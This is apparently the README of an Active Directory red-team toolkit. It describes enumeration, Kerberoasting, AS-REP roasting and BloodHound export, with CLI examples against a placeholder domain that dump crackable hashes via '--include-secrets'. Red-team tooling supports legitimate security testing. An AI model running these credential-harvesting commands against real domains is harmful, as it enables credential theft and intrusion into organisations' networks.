# ADAF-ATTACK

**Aggressive Active Directory offensive toolkit for senior internal red teamers.**

> Authorized internal red team use only.

## Philosophy

- No plan-only mode
- No lab certification / containment gates
- Lightweight controls: `--force` for destructive actions, secrets redacted by default, session logging

## Capabilities (v0.4.0)

| ID | Category | Description |
|----|----------|-------------|
| `ldap-enum` | enumeration | Users, computers, groups, trusts, SPNs |
| `trusts-enum` | enumeration | Deep trusts (direction, SID filtering, forest vs external, risk notes) |
| `adcs-enum` | enumeration | AD CS CAs, certificate templates, ESC1-style candidates |
| `kerberoast` | credential-access | TGS → hashcat `$krb5tgs$23$` |
| `asrep-roast` | credential-access | AS-REP → hashcat `$krb5asrep$23$` |
| `bloodhound-export` | export | BloodHound CE-friendly graph JSON |

Attack-path graph is built during collection with path ranking (`interesting.json`).

## Install

```bash
pip install -e ".[dev]"
pip install -e ".[dev,kerberos]"   # roasting
pip install -e ".[dev,tui]"        # interactive shell
pip install -e ".[full]"
```

## CLI examples

```bash
adaf-attack list-capabilities

# Core enum
adaf-attack run ldap-enum -d corp.local --dc-ip 10.0.0.10 -u alice -p 'Password1'
adaf-attack run trusts-enum -d corp.local --dc-ip 10.0.0.10 -u alice -p 'Password1'
adaf-attack run adcs-enum -d corp.local --dc-ip 10.0.0.10 -u alice -p 'Password1'

# Roasting
adaf-attack run kerberoast -d corp.local --dc-ip 10.0.0.10 -u alice -p 'Password1' --include-secrets
adaf-attack run asrep-roast -d corp.local --dc-ip 10.0.0.10 -u alice -p 'Password1' --include-secrets

# BloodHound export (seeds from ldap-enum if graph empty)
adaf-attack run bloodhound-export -d corp.local --dc-ip 10.0.0.10 -u alice -p 'Password1'

# TUI
adaf-attack start
```

## Output layout

```
workspaces/<session-id>/
  session.json
  events.jsonl
  ldap-enum.json
  trusts-enum.json
  adcs-enum.json
  kerberoast.json / kerberoast.hashes.txt
  asrep-roast.json / asrep-roast.hashes.txt
  graph.json
  interesting.json
  bloodhound.json
```

## License

Private. Internal use only.
